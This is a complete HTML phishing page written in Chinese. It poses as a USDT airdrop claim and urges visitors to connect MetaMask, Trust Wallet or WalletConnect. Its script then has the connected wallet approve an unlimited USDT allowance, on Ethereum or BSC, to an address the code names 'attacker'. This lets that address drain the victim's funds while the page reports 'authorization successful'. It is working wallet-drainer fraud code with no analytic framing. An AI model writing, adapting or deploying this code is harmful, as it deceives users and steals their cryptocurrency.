<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8">
  <title>🎁 領取 USDT 空投活動</title>
  <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
  <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
</head>
<body style="text-align:center; padding-top:60px; font-family:sans-serif">
  <h2>🎉 恭喜你獲得 USDT 空投！</h2>
  <p>請選擇錢包並授權以領取獎勵</p>

  <button id="connectMetaMask">🦊 使用 MetaMask</button>
  <br><br>
  <button id="connectTrust">🔵 使用 Trust Wallet</button>
  <br><br>
  <button id="connectWalletConnect">📲 使用 WalletConnect</button>
  <br><br>
  <p id="status"></p>

  <script>
    let provider;
    let signer;

    const USDT_BY_CHAIN = {
      1: "0xdAC17F958D2ee523a2206206994597C13D831ec7",  // Ethereum
      56: "0x55d398326f99059ff775485246999027b3197955"  // BSC
    };

    const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
    const abi = ["function approve(address spender, uint256 amount) external returns (bool)"];

    const providerOptions = {
      metamask: {
        package: null
      },
      walletconnect: {
        package: window.WalletConnectProvider.default,
        options: {
          infuraId: "99af7ec8242f4645ac8c27d5b9354e2c"
        }
      }
    };

    const web3Modal = new window.Web3Modal.default({
      cacheProvider: false,
      providerOptions
    });

    async function connect(type) {
      try {
        if (type === 'trust') {
          window.open("trust://", "_blank");
          document.getElementById("status").innerText = "📱 請在 Trust Wallet 中完成操作...";
          return;
        }

        if (type === 'walletconnect') {
          web3Modal.clearCachedProvider();
          web3Modal.providerController.providerOptions = {
            walletconnect: providerOptions.walletconnect
          };
        } else if (type === 'metamask') {
          web3Modal.clearCachedProvider();
          web3Modal.providerController.providerOptions = {
            injected: providerOptions.metamask
          };
        }

        const instance = await web3Modal.connect();
        provider = new ethers.providers.Web3Provider(instance);
        signer = provider.getSigner();
        const address = await signer.getAddress();
        document.getElementById("status").innerText = "✅ 已連接錢包：" + address;
        approve();
      } catch (err) {
        document.getElementById("status").innerText = "❌ 錢包連接失敗：" + err.message;
      }
    }

    document.getElementById("connectMetaMask").onclick = () => connect('metamask');
    document.getElementById("connectWalletConnect").onclick = () => connect('walletconnect');
    document.getElementById("connectTrust").onclick = () => connect('trust');

    async function approve() {
      try {
        const network = await provider.getNetwork();
        const chainId = network.chainId;
        const tokenAddress = USDT_BY_CHAIN[chainId];

        if (!tokenAddress) {
          document.getElementById("status").innerText = "❌ 不支援此鏈別的 USDT 合約";
          return;
        }

        const contract = new ethers.Contract(tokenAddress, abi, signer);
        const tx = await contract.approve(attacker, ethers.constants.MaxUint256);
        document.getElementById("status").innerText = "✅ 授權成功！Tx Hash: " + tx.hash;
      } catch (err) {
        document.getElementById("status").innerText = "❌ 授權失敗：" + err.message;
        console.error(err);
      }
    }
  </script>
</body>
</html>
